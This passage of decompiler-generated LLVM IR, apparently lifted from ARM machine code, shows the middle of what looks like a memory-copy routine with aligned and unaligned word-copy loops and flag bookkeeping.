
dec_label_pc_17000.dec_label_pc_17000_crit_edge:  ; preds = %dec_label_pc_17000
  %v0_17000.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_17004.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17000

dec_label_pc_17030:                               ; preds = %dec_label_pc_17000
  %v2_17030 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17030, i32* @r4, align 4
  %v5_17030 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_17030, i32* @r5, align 4
  %v1_17034 = add i32 %v0_17028, -4
  store i32 %v1_17034, i32* %r2.global-to-local, align 4
  %v3_17034 = add i32 %v0_17028, 2147483632
  %v4_17034 = and i32 %v1_17034, %v3_17034
  %v5_17034 = icmp slt i32 %v4_17034, 0
  store i1 %v5_17034, i1* %cpsr_v.global-to-local, align 1
  %v6_17034 = icmp slt i32 %v1_17034, 0
  store i1 %v6_17034, i1* %cpsr_n.global-to-local, align 1
  %v7_17034 = icmp eq i32 %v1_17034, 0
  store i1 %v7_17034, i1* %cpsr_z.global-to-local, align 1
  %v2_17038 = xor i1 %v6_17034, %v5_17034
  br i1 %v2_17038, label %dec_label_pc_17054, label %dec_label_pc_1703c

dec_label_pc_1703c:                               ; preds = %dec_label_pc_17030, %dec_label_pc_16ff0, %dec_label_pc_1703c
  %v1_17048 = phi i32 [ %v4_17048, %dec_label_pc_1703c ], [ %v12_17024, %dec_label_pc_17030 ], [ %v0_170fc76, %dec_label_pc_16ff0 ]
  %v0_1703c = load i32, i32* %lr.global-to-local, align 4
  %v3_1703c = udiv i32 %v0_1703c, 256
  store i32 %v3_1703c, i32* %ip.global-to-local, align 4
  %v0_17040 = load i32, i32* %r1.global-to-local, align 4
  %v1_17040 = inttoptr i32 %v0_17040 to i32*
  %v2_17040 = load i32, i32* %v1_17040, align 4
  store i32 %v2_17040, i32* %lr.global-to-local, align 4
  %v4_17040 = add i32 %v0_17040, 4
  store i32 %v4_17040, i32* %r1.global-to-local, align 4
  %v4_17044 = mul i32 %v2_17040, 16777216
  %v5_17044 = or i32 %v4_17044, %v3_1703c
  store i32 %v5_17044, i32* @ip, align 4
  %v2_17048 = inttoptr i32 %v1_17048 to i32*
  store i32 %v5_17044, i32* %v2_17048, align 4
  %v3_17048 = load i32, i32* @r0, align 4
  %v4_17048 = add i32 %v3_17048, 4
  store i32 %v4_17048, i32* @r0, align 4
  %v0_1704c = load i32, i32* %r2.global-to-local, align 4
  %v1_1704c = add i32 %v0_1704c, -4
  store i32 %v1_1704c, i32* %r2.global-to-local, align 4
  %v3_1704c = sub i32 3, %v0_1704c
  %v4_1704c = and i32 %v3_1704c, %v0_1704c
  %v5_1704c = icmp slt i32 %v4_1704c, 0
  %v6_1704c = icmp slt i32 %v1_1704c, 0
  %v2_17050 = xor i1 %v6_1704c, %v5_1704c
  br i1 %v2_17050, label %dec_label_pc_17054.loopexit, label %dec_label_pc_1703c

dec_label_pc_17054.loopexit:                      ; preds = %dec_label_pc_1703c
  %v7_1704c = icmp eq i32 %v0_1704c, 4
  store i1 %v5_1704c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1704c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1704c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17054

dec_label_pc_17054:                               ; preds = %dec_label_pc_17054.loopexit, %dec_label_pc_17030
  %v0_16f7c59 = phi i32 [ %v1_1704c, %dec_label_pc_17054.loopexit ], [ %v1_17034, %dec_label_pc_17030 ]
  %v0_17054 = load i32, i32* %r1.global-to-local, align 4
  %v1_17054 = add i32 %v0_17054, -3
  store i32 %v1_17054, i32* @r1, align 4
  br label %bb140

dec_label_pc_1705c:                               ; preds = %dec_label_pc_16fdc
  br i1 %v2_17060, label %dec_label_pc_170a8, label %dec_label_pc_17064

dec_label_pc_17064:                               ; preds = %dec_label_pc_1705c
  store i32 %v1_1705c, i32* %r2.global-to-local, align 4
  %v3_17068 = load i32, i32* @r4, align 4
  store i32 %v3_17068, i32* %stack_var_-16, align 4
  %v6_17068 = load i32, i32* @r5, align 4
  store i32 %v6_17068, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1706c

dec_label_pc_1706c:                               ; preds = %dec_label_pc_1706c.dec_label_pc_1706c_crit_edge, %dec_label_pc_17064
  %v0_17090 = phi i32 [ %v12_17090, %dec_label_pc_1706c.dec_label_pc_1706c_crit_edge ], [ %v0_170fc76, %dec_label_pc_17064 ]
  %v0_17070 = phi i32 [ %v0_17070.pre, %dec_label_pc_1706c.dec_label_pc_1706c_crit_edge ], [ %v4_16fe0, %dec_label_pc_17064 ]
  %v0_1706c = phi i32 [ %v0_1706c.pre, %dec_label_pc_1706c.dec_label_pc_1706c_crit_edge ], [ %v2_16fe0, %dec_label_pc_17064 ]
  %v3_1706c = udiv i32 %v0_1706c, 65536
  %v1_17070 = inttoptr i32 %v0_17070 to i32*
  %v2_17070 = load i32, i32* %v1_17070, align 4
  store i32 %v2_17070, i32* %r4.global-to-local, align 4
  %v3_17070 = add i32 %v0_17070, 4
  %v4_17070 = inttoptr i32 %v3_17070 to i32*
  %v5_17070 = load i32, i32* %v4_17070, align 4
  store i32 %v5_17070, i32* %r5.global-to-local, align 4
  %v6_17070 = add i32 %v0_17070, 8
  %v7_17070 = inttoptr i32 %v6_17070 to i32*
  %v8_17070 = load i32, i32* %v7_17070, align 4
  store i32 %v8_17070, i32* %ip.global-to-local, align 4
  %v9_17070 = add i32 %v0_17070, 12
  %v10_17070 = inttoptr i32 %v9_17070 to i32*
  %v11_17070 = load i32, i32* %v10_17070, align 4
  store i32 %v11_17070, i32* %lr.global-to-local, align 4
  %v12_17070 = add i32 %v0_17070, 16
  store i32 %v12_17070, i32* %r1.global-to-local, align 4
  %v4_17074 = mul i32 %v2_17070, 65536
  %v5_17074 = or i32 %v4_17074, %v3_1706c
  store i32 %v5_17074, i32* @r3, align 4
  %v3_17078 = udiv i32 %v2_17070, 65536
  %v4_1707c = mul i32 %v5_17070, 65536
  %v5_1707c = or i32 %v4_1707c, %v3_17078
  store i32 %v5_1707c, i32* %r4.global-to-local, align 4
  %v3_17080 = udiv i32 %v5_17070, 65536
  %v4_17084 = mul i32 %v8_17070, 65536
  %v5_17084 = or i32 %v4_17084, %v3_17080
  store i32 %v5_17084, i32* %r5.global-to-local, align 4
  %v3_17088 = udiv i32 %v8_17070, 65536
  %v4_1708c = mul i32 %v11_17070, 65536
  %v5_1708c = or i32 %v4_1708c, %v3_17088
  store i32 %v5_1708c, i32* @ip, align 4
  %v1_17090 = inttoptr i32 %v0_17090 to i32*
  store i32 %v5_17074, i32* %v1_17090, align 4
  %v3_17090 = add i32 %v0_17090, 4
  %v4_17090 = inttoptr i32 %v3_17090 to i32*
  %v5_17090 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17090, i32* %v4_17090, align 4
  %v6_17090 = add i32 %v0_17090, 8
  %v7_17090 = inttoptr i32 %v6_17090 to i32*
  %v8_17090 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_17090, i32* %v7_17090, align 4
  %v9_17090 = add i32 %v0_17090, 12
  %v10_17090 = inttoptr i32 %v9_17090 to i32*
  %v11_17090 = load i32, i32* @ip, align 4
  store i32 %v11_17090, i32* %v10_17090, align 4
  %v12_17090 = add i32 %v0_17090, 16
  store i32 %v12_17090, i32* @r0, align 4
  %v0_17094 = load i32, i32* %r2.global-to-local, align 4
  %v1_17094 = add i32 %v0_17094, -16
  store i32 %v1_17094, i32* %r2.global-to-local, align 4
  %v3_17094 = sub i32 15, %v0_17094
  %v4_17094 = and i32 %v3_17094, %v0_17094
  %v5_17094 = icmp slt i32 %v4_17094, 0
  %v6_17094 = icmp slt i32 %v1_17094, 0
  %v2_17098 = xor i1 %v6_17094, %v5_17094
  br i1 %v2_17098, label %dec_label_pc_1709c, label %dec_label_pc_1706c.dec_label_pc_1706c_crit_edge

dec_label_pc_1706c.dec_label_pc_1706c_crit_edge:  ; preds = %dec_label_pc_1706c
  %v0_1706c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_17070.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1706c

dec_label_pc_1709c:                               ; preds = %dec_label_pc_1706c
  %v2_1709c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1709c, i32* @r4, align 4
  %v5_1709c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1709c, i32* @r5, align 4
  %v1_170a0 = add i32 %v0_17094, -4
  store i32 %v1_170a0, i32* %r2.global-to-local, align 4
  %v3_170a0 = add i32 %v0_17094, 2147483632
  %v4_170a0 = and i32 %v1_170a0, %v3_170a0
  %v5_170a0 = icmp slt i32 %v4_170a0, 0
  store i1 %v5_170a0, i1* %cpsr_v.global-to-local, align 1
  %v6_170a0 = icmp slt i32 %v1_170a0, 0
  store i1 %v6_170a0, i1* %cpsr_n.global-to-local, align 1
  %v7_170a0 = icmp eq i32 %v1_170a0, 0
  store i1 %v7_170a0, i1* %cpsr_z.global-to-local, align 1
  %v2_170a4 = xor i1 %v6_170a0, %v5_170a0
  br i1 %v2_170a4, label %dec_label_pc_170c0, label %dec_label_pc_170a8

dec_label_pc_170a8:                               ; preds = %dec_label_pc_1709c, %dec_label_pc_1705c, %dec_label_pc_170a8
  %v1_170b4 = phi i32 [ %v4_170b4, %dec_label_pc_170a8 ], [ %v12_17090, %dec_label_pc_1709c ], [ %v0_170fc76, %dec_label_pc_1705c ]
  %v0_170a8 = load i32, i32* %lr.global-to-local, align 4
  %v3_170a8 = udiv i32 %v0_170a8, 65536
  store i32 %v3_170a8, i32* %ip.global-to-local, align 4
  %v0_170ac = load i32, i32* %r1.global-to-local, align 4
  %v1_170ac = inttoptr i32 %v0_170ac to i32*
  %v2_170ac = load i32, i32* %v1_170ac, align 4
  store i32 %v2_170ac, i32* %lr.global-to-local, align 4
  %v4_170ac = add i32 %v0_170ac, 4
  store i32 %v4_170ac, i32* %r1.global-to-local, align 4
  %v4_170b0 = mul i32 %v2_170ac, 65536
  %v5_170b0 = or i32 %v4_170b0, %v3_170a8
  store i32 %v5_170b0, i32* @ip, align 4
  %v2_170b4 = inttoptr i32 %v1_170b4 to i32*
  store i32 %v5_170b0, i32* %v2_170b4, align 4
  %v3_170b4 = load i32, i32* @r0, align 4
  %v4_170b4 = add i32 %v3_170b4, 4
  store i32 %v4_170b4, i32* @r0, align 4
  %v0_170b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_170b8 = add i32 %v0_170b8, -4
  store i32 %v1_170b8, i32* %r2.global-to-local, align 4
  %v3_170b8 = sub i32 3, %v0_170b8
  %v4_170b8 = and i32 %v3_170b8, %v0_170b8
  %v5_170b8 = icmp slt i32 %v4_170b8, 0
  %v6_170b8 = icmp slt i32 %v1_170b8, 0
  %v2_170bc = xor i1 %v6_170b8, %v5_170b8
  br i1 %v2_170bc, label %dec_label_pc_170c0.loopexit, label %dec_label_pc_170a8

dec_label_pc_170c0.loopexit:                      ; preds = %dec_label_pc_170a8
  %v7_170b8 = icmp eq i32 %v0_170b8, 4
  store i1 %v5_170b8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_170b8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_170b8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_170c0

dec_label_pc_170c0:                               ; preds = %dec_label_pc_170c0.loopexit, %dec_label_pc_1709c
  %v0_16f7c60 = phi i32 [ %v1_170b8, %dec_label_pc_170c0.loopexit ], [ %v1_170a0, %dec_label_pc_1709c ]
  %v0_170c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_170c0 = add i32 %v0_170c0, -2
  store i32 %v1_170c0, i32* @r1, align 4
  br label %bb140

dec_label_pc_170c8:                               ; preds = %dec_label_pc_16fdc
  br i1 %v2_17060, label %dec_label_pc_17114, label %dec_label_pc_170d0

dec_label_pc_170d0:                               ; preds = %dec_label_pc_170c8
  store i32 %v1_1705c, i32* %r2.global-to-local, align 4
  %v3_170d4 = load i32, i32* @r4, align 4
  store i32 %v3_170d4, i32* %stack_var_-16, align 4
  %v6_170d4 = load i32, i32* @r5, align 4
  store i32 %v6_170d4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_170d8

dec_label_pc_170d8:                               ; preds = %dec_label_pc_170d8.dec_label_pc_170d8_crit_edge, %dec_label_pc_170d0
  %v0_170fc = phi i32 [ %v12_170fc, %dec_label_pc_170d8.dec_label_pc_170d8_crit_edge ], [ %v0_170fc76, %dec_label_pc_170d0 ]
  %v0_170dc = phi i32 [ %v0_170dc.pre, %dec_label_pc_170d8.dec_label_pc_170d8_crit_edge ], [ %v4_16fe0, %dec_label_pc_170d0 ]
  %v0_170d8 = phi i32 [ %v0_170d8.pre, %dec_label_pc_170d8.dec_label_pc_170d8_crit_edge ], [ %v2_16fe0, %dec_label_pc_170d0 ]
  %v3_170d8 = udiv i32 %v0_170d8, 16777216
  %v1_170dc = inttoptr i32 %v0_170dc to i32*
  %v2_170dc = load i32, i32* %v1_170dc, align 4
  store i32 %v2_170dc, i32* %r4.global-to-local, align 4
  %v3_170dc = add i32 %v0_170dc, 4
  %v4_170dc = inttoptr i32 %v3_170dc to i32*
  %v5_170dc = load i32, i32* %v4_170dc, align 4
  store i32 %v5_170dc, i32* %r5.global-to-local, align 4
  %v6_170dc = add i32 %v0_170dc, 8
  %v7_170dc = inttoptr i32 %v6_170dc to i32*
  %v8_170dc = load i32, i32* %v7_170dc, align 4
  store i32 %v8_170dc, i32* %ip.global-to-local, align 4
  %v9_170dc = add i32 %v0_170dc, 12
  %v10_170dc = inttoptr i32 %v9_170dc to i32*
  %v11_170dc = load i32, i32* %v10_170dc, align 4
  store i32 %v11_170dc, i32* %lr.global-to-local, align 4
  %v12_170dc = add i32 %v0_170dc, 16
  store i32 %v12_170dc, i32* %r1.global-to-local, align 4
  %v4_170e0 = mul i32 %v2_170dc, 256
  %v5_170e0 = or i32 %v4_170e0, %v3_170d8
  store i32 %v5_170e0, i32* @r3, align 4
  %v3_170e4 = udiv i32 %v2_170dc, 16777216
  %v4_170e8 = mul i32 %v5_170dc, 256
  %v5_170e8 = or i32 %v4_170e8, %v3_170e4
  store i32 %v5_170e8, i32* %r4.global-to-local, align 4
  %v3_170ec = udiv i32 %v5_170dc, 16777216
  %v4_170f0 = mul i32 %v8_170dc, 256
  %v5_170f0 = or i32 %v4_170f0, %v3_170ec
  store i32 %v5_170f0, i32* %r5.global-to-local, align 4
  %v3_170f4 = udiv i32 %v8_170dc, 16777216
  %v4_170f8 = mul i32 %v11_170dc, 256
  %v5_170f8 = or i32 %v4_170f8, %v3_170f4
  store i32 %v5_170f8, i32* @ip, align 4
  %v1_170fc = inttoptr i32 %v0_170fc to i32*
  store i32 %v5_170e0, i32* %v1_170fc, align 4
  %v3_170fc = add i32 %v0_170fc, 4
  %v4_170fc = inttoptr i32 %v3_170fc to i32*
  %v5_170fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_170fc, i32* %v4_170fc, align 4
  %v6_170fc = add i32 %v0_170fc, 8
  %v7_170fc = inttoptr i32 %v6_170fc to i32*
  %v8_170fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_170fc, i32* %v7_170fc, align 4
  %v9_170fc = add i32 %v0_170fc, 12
  %v10_170fc = inttoptr i32 %v9_170fc to i32*
  %v11_170fc = load i32, i32* @ip, align 4
  store i32 %v11_170fc, i32* %v10_170fc, align 4
  %v12_170fc = add i32 %v0_170fc, 16
  store i32 %v12_170fc, i32* @r0, align 4
  %v0_17100 = load i32, i32* %r2.global-to-local, align 4
  %v1_17100 = add i32 %v0_17100, -16
  store i32 %v1_17100, i32* %r2.global-to-local, align 4
  %v3_17100 = sub i32 15, %v0_17100
  %v4_17100 = and i32 %v3_17100, %v0_17100
  %v5_17100 = icmp slt i32 %v4_17100, 0
  %v6_17100 = icmp slt i32 %v1_17100, 0
  %v2_17104 = xor i1 %v6_17100, %v5_17100
  br i1 %v2_17104, label %dec_label_pc_17108, label %dec_label_pc_170d8.dec_label_pc_170d8_crit_edge

dec_label_pc_170d8.dec_label_pc_170d8_crit_edge:  ; preds = %dec_label_pc_170d8
  %v0_170d8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_170dc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_170d8

dec_label_pc_17108:                               ; preds = %dec_label_pc_170d8
  %v2_17108 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17108, i32* @r4, align 4
  %v5_17108 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_17108, i32* @r5, align 4
  %v1_1710c = add i32 %v0_17100, -4
  store i32 %v1_1710c, i32* %r2.global-to-local, align 4
  %v3_1710c = add i32 %v0_17100, 2147483632
  %v4_1710c = and i32 %v1_1710c, %v3_1710c
  %v5_1710c = icmp slt i32 %v4_1710c, 0
  store i1 %v5_1710c, i1* %cpsr_v.global-to-local, align 1
  %v6_1710c = icmp slt i32 %v1_1710c, 0
  store i1 %v6_1710c, i1* %cpsr_n.global-to-local, align 1
  %v7_1710c = icmp eq i32 %v1_1710c, 0
  store i1 %v7_1710c, i1* %cpsr_z.global-to-local, align 1
  %v2_17110 = xor i1 %v6_1710c, %v5_1710c
  br i1 %v2_17110, label %dec_label_pc_1712c, label %dec_label_pc_17114

dec_label_pc_17114:                               ; preds = %dec_label_pc_17108, %dec_label_pc_170c8, %dec_label_pc_17114
  %v1_17120 = phi i32 [ %v4_17120, %dec_label_pc_17114 ], [ %v12_170fc, %dec_label_pc_17108 ], [ %v0_170fc76, %dec_label_pc_170c8 ]
  %v0_17114 = load i32, i32* %lr.global-to-local, align 4
  %v3_17114 = udiv i32 %v0_17114, 16777216
  store i32 %v3_17114, i32* %ip.global-to-local, align 4
  %v0_17118 = load i32, i32* %r1.global-to-local, align 4
  %v1_17118 = inttoptr i32 %v0_17118 to i32*
  %v2_17118 = load i32, i32* %v1_17118, align 4
  store i32 %v2_17118, i32* %lr.global-to-local, align 4
  %v4_17118 = add i32 %v0_17118, 4
  store i32 %v4_17118, i32* %r1.global-to-local, align 4
  %v4_1711c = mul i32 %v2_17118, 256
  %v5_1711c = or i32 %v4_1711c, %v3_17114
  store i32 %v5_1711c, i32* @ip, align 4
  %v2_17120 = inttoptr i32 %v1_17120 to i32*
  store i32 %v5_1711c, i32* %v2_17120, align 4
  %v3_17120 = load i32, i32* @r0, align 4
  %v4_17120 = add i32 %v3_17120, 4
  store i32 %v4_17120, i32* @r0, align 4
  %v0_17124 = load i32, i32* %r2.global-to-local, align 4
  %v1_17124 = add i32 %v0_17124, -4
  store i32 %v1_17124, i32* %r2.global-to-local, align 4
  %v3_17124 = sub i32 3, %v0_17124
  %v4_17124 = and i32 %v3_17124, %v0_17124
  %v5_17124 = icmp slt i32 %v4_17124, 0
  %v6_17124 = icmp slt i32 %v1_17124, 0
  %v2_17128 = xor i1 %v6_17124, %v5_17124
  br i1 %v2_17128, label %dec_label_pc_1712c.loopexit, label %dec_label_pc_17114

dec_label_pc_1712c.loopexit:                      ; preds = %dec_label_pc_17114
  %v7_17124 = icmp eq i32 %v0_17124, 4
  store i1 %v5_17124, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_17124, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_17124, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1712c

dec_label_pc_1712c:                               ; preds = %dec_label_pc_1712c.loopexit, %dec_label_pc_17108
  %v0_16f7c61 = phi i32 [ %v1_17124, %dec_label_pc_1712c.loopexit ], [ %v1_1710c, %dec_label_pc_17108 ]
  %v0_1712c = load i32, i32* %r1.global-to-local, align 4
  %v1_1712c = add i32 %v0_1712c, -1
  store i32 %v1_1712c, i32* @r1, align 4
  br label %bb140

dec_label_pc_17134:                               ; preds = %entry
  %v1_17134 = load i32, i32* @r2, align 4
  %v2_17134 = add i32 %v1_17134, %v0_16ee0
  store i32 %v2_17134, i32* %r1.global-to-local, align 4
  %v2_17138 = add i32 %v1_17134, %v1_16ee0
  store i32 %v2_17138, i32* %r0.global-to-local, align 4
  %v2_1713c = add i32 %v1_17134, -4
  store i32 %v2_1713c, i32* %r2.global-to-local, align 4
  %v4_1713c = sub i32 3, %v1_17134
  %v5_1713c = and i32 %v4_1713c, %v1_17134
  %v6_1713c = icmp slt i32 %v5_1713c, 0
  store i1 %v6_1713c, i1* %cpsr_v.global-to-local, align 1
  %v7_1713c = icmp slt i32 %v2_1713c, 0
  store i1 %v7_1713c, i1* %cpsr_n.global-to-local, align 1
  %v8_1713c = icmp eq i32 %v1_17134, 4
  store i1 %v8_1713c, i1* %cpsr_z.global-to-local, align 1
  %v5_17140 = icmp slt i32 %v1_17134, 4
  br i1 %v5_17140, label %bb150, label %dec_label_pc_17144

dec_label_pc_17144:                               ; preds = %dec_label_pc_17134
  %v1_17144 = urem i32 %v2_17138, 4
  store i32 %v1_17144, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17144 = icmp eq i32 %v1_17144, 0
  store i1 %v2_17144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17144, label %dec_label_pc_1714c, label %dec_label_pc_171ec

dec_label_pc_1714c:                               ; preds = %dec_label_pc_17144
  %v1_1714c = urem i32 %v2_17134, 4
  store i32 %v1_1714c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1714c = icmp eq i32 %v1_1714c, 0
  store i1 %v2_1714c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1714c, label %dec_label_pc_17154, label %dec_label_pc_17218

dec_label_pc_17154:                               ; preds = %dec_label_pc_1714c, %dec_label_pc_17210
  %v0_1716c37 = phi i32 [ %v2_17138, %dec_label_pc_1714c ], [ %v0_1726020, %dec_label_pc_17210 ]
  %v0_1716836 = phi i32 [ %v2_17134, %dec_label_pc_1714c ], [ %v0_17210, %dec_label_pc_17210 ]
  %v0_17154 = phi i32 [ %v2_1713c, %dec_label_pc_1714c ], [ %v2_17208, %dec_label_pc_17210 ]
  %v2_17154 = add i32 %v0_17154, -8
  store i32 %v2_17154, i32* %r2.global-to-local, align 4
  %v4_17154 = sub i32 7, %v0_17154
  %v5_17154 = and i32 %v4_17154, %v0_17154
  %v6_17154 = icmp slt i32 %v5_17154, 0
  store i1 %v6_17154, i1* %cpsr_v.global-to-local, align 1
  %v7_17154 = icmp slt i32 %v2_17154, 0
  store i1 %v7_17154, i1* %cpsr_n.global-to-local, align 1
  %v8_17154 = icmp eq i32 %v0_17154, 8
  store i1 %v8_17154, i1* %cpsr_z.global-to-local, align 1
  %v5_17158 = icmp slt i32 %v0_17154, 8
  br i1 %v5_17158, label %dec_label_pc_171a4, label %dec_label_pc_1715c

dec_label_pc_1715c:                               ; preds = %dec_label_pc_17154
  %v3_1715c = load i32, i32* @r4, align 4
  %v5_1715c = inttoptr i32 %v3_1715c to i8*
  store i8* %v5_1715c, i8** %stack_var_-8, align 4
  %v8_1715c = load i32, i32* @lr, align 4
  %v2_17160 = add i32 %v0_17154, -28
  store i32 %v2_17160, i32* %r2.global-to-local, align 4
  %v4_17160 = sub i32 27, %v0_17154
  %v5_17160 = and i32 %v4_17160, %v2_17154
  %v6_17160 = icmp slt i32 %v5_17160, 0
  store i1 %v6_17160, i1* %cpsr_v.global-to-local, align 1
  %v7_17160 = icmp slt i32 %v2_17160, 0
  store i1 %v7_17160, i1* %cpsr_n.global-to-local, align 1
  %v8_17160 = icmp eq i32 %v2_17154, 20
  store i1 %v8_17160, i1* %cpsr_z.global-to-local, align 1
  %v5_17164 = icmp slt i32 %v2_17154, 20
  br i1 %v5_17164, label %dec_label_pc_17180, label %dec_label_pc_17168

dec_label_pc_17168:                               ; preds = %dec_label_pc_1715c, %dec_label_pc_17168.dec_label_pc_17168_crit_edge
  %v0_1716c = phi i32 [ %v1_17174, %dec_label_pc_17168.dec_label_pc_17168_crit_edge ], [ %v0_1716c37, %dec_label_pc_1715c ]
  %v0_17168 = phi i32 [ %v0_17168.pre, %dec_label_pc_17168.dec_label_pc_17168_crit_edge ], [ %v0_1716836, %dec_label_pc_1715c ]
  %v1_17168 = add i32 %v0_17168, -4
  %v2_17168 = inttoptr i32 %v1_17168 to i32*
  %v3_17168 = load i32, i32* %v2_17168, align 4
  %v4_17168 = add i32 %v0_17168, -8
  %v5_17168 = inttoptr i32 %v4_17168 to i32*
  %v6_17168 = load i32, i32* %v5_17168, align 4
  store i32 %v6_17168, i32* %r4.global-to-local, align 4
  %v7_17168 = add i32 %v0_17168, -12
  %v8_17168 = inttoptr i32 %v7_17168 to i32*
  %v9_17168 = load i32, i32* %v8_17168, align 4
  store i32 %v9_17168, i32* %ip.global-to-local, align 4
  %v10_17168 = add i32 %v0_17168, -16
  %v11_17168 = inttoptr i32 %v10_17168 to i32*
  %v12_17168 = load i32, i32* %v11_17168, align 4
  store i32 %v12_17168, i32* %lr.global-to-local, align 4
  store i32 %v10_17168, i32* %r1.global-to-local, align 4
  %v1_1716c = add i32 %v0_1716c, -16
  %v2_1716c = inttoptr i32 %v1_1716c to i32*
  store i32 %v3_17168, i32* %v2_1716c, align 4
  %v4_1716c = add i32 %v0_1716c, -12
  %v5_1716c = inttoptr i32 %v4_1716c to i32*
  %v6_1716c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1716c, i32* %v5_1716c, align 4
  %v7_1716c = add i32 %v0_1716c, -8
  %v8_1716c = inttoptr i32 %v7_1716c to i32*
  %v9_1716c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1716c, i32* %v8_1716c, align 4
  %v10_1716c = add i32 %v0_1716c, -4
  %v11_1716c = inttoptr i32 %v10_1716c to i32*
  %v12_1716c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1716c, i32* %v11_1716c, align 4
  store i32 %v1_1716c, i32* %r0.global-to-local, align 4
  %v0_17170 = load i32, i32* %r1.global-to-local, align 4
  %v1_17170 = add i32 %v0_17170, -4
  %v2_17170 = inttoptr i32 %v1_17170 to i32*
  %v3_17170 = load i32, i32* %v2_17170, align 4
  store i32 %v3_17170, i32* @r3, align 4
  %v4_17170 = add i32 %v0_17170, -8
  %v5_17170 = inttoptr i32 %v4_17170 to i32*
  %v6_17170 = load i32, i32* %v5_17170, align 4
  store i32 %v6_17170, i32* %r4.global-to-local, align 4
  %v7_17170 = add i32 %v0_17170, -12
  %v8_17170 = inttoptr i32 %v7_17170 to i32*
  %v9_17170 = load i32, i32* %v8_17170, align 4
  store i32 %v9_17170, i32* @ip, align 4
  %v10_17170 = add i32 %v0_17170, -16
  %v11_17170 = inttoptr i32 %v10_17170 to i32*
  %v12_17170 = load i32, i32* %v11_17170, align 4
  store i32 %v12_17170, i32* %lr.global-to-local, align 4
  store i32 %v10_17170, i32* %r1.global-to-local, align 4
  %v1_17174 = add i32 %v0_1716c, -32
  %v2_17174 = inttoptr i32 %v1_17174 to i32*
  store i32 %v3_17170, i32* %v2_17174, align 4
  %v4_17174 = add i32 %v0_1716c, -28
  %v5_17174 = inttoptr i32 %v4_17174 to i32*
  %v6_17174 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_17174, i32* %v5_17174, align 4
  %v7_17174 = add i32 %v0_1716c, -24
  %v8_17174 = inttoptr i32 %v7_17174 to i32*
  %v9_17174 = load i32, i32* @ip, align 4
  store i32 %v9_17174, i32* %v8_17174, align 4
  %v10_17174 = add i32 %v0_1716c, -20
  %v11_17174 = inttoptr i32 %v10_17174 to i32*
  %v12_17174 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17174, i32* %v11_17174, align 4
  store i32 %v1_17174, i32* %r0.global-to-local, align 4
  %v0_17178 = load i32, i32* %r2.global-to-local, align 4
  %v2_17178 = add i32 %v0_17178, -32
  store i32 %v2_17178, i32* %r2.global-to-local, align 4
  %v6_1717c = icmp slt i32 %v0_17178, 32
  br i1 %v6_1717c, label %dec_label_pc_17180.loopexit, label %dec_label_pc_17168.dec_label_pc_17168_crit_edge

dec_label_pc_17168.dec_label_pc_17168_crit_edge:  ; preds = %dec_label_pc_17168
  %v0_17168.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17168

dec_label_pc_17180.loopexit:                      ; preds = %dec_label_pc_17168
  %v4_17178 = sub i32 31, %v0_17178
  %v5_17178 = and i32 %v4_17178, %v0_17178
  %v6_17178 = icmp slt i32 %v5_17178, 0
  %v7_17178 = icmp slt i32 %v2_17178, 0
  store i1 %v6_17178, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17178, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17180

dec_label_pc_17180:                               ; preds = %dec_label_pc_17180.loopexit, %dec_label_pc_1715c
  %v6_17188 = phi i32 [ %v1_17174, %dec_label_pc_17180.loopexit ], [ %v0_1716c37, %dec_label_pc_1715c ]
  %v0_17190.pr = phi i32 [ %v2_17178, %dec_label_pc_17180.loopexit ], [ %v2_17160, %dec_label_pc_1715c ]
  %v4_17180 = add i32 %v0_17190.pr, 16
  %v6_17180 = sub i32 0, %v0_17190.pr
  %v7_17180 = and i32 %v4_17180, %v6_17180
  %v8_17180 = icmp slt i32 %v7_17180, 0
  store i1 %v8_17180, i1* %cpsr_v.global-to-local, align 1
  %v9_17180 = icmp slt i32 %v4_17180, 0
  store i1 %v9_17180, i1* %cpsr_n.global-to-local, align 1
  %v10_17180 = icmp eq i32 %v4_17180, 0
  store i1 %v10_17180, i1* %cpsr_z.global-to-local, align 1
  %v5_17184 = icmp slt i32 %v0_17190.pr, -16
  br i1 %v5_17184, label %.thread2, label %bb147

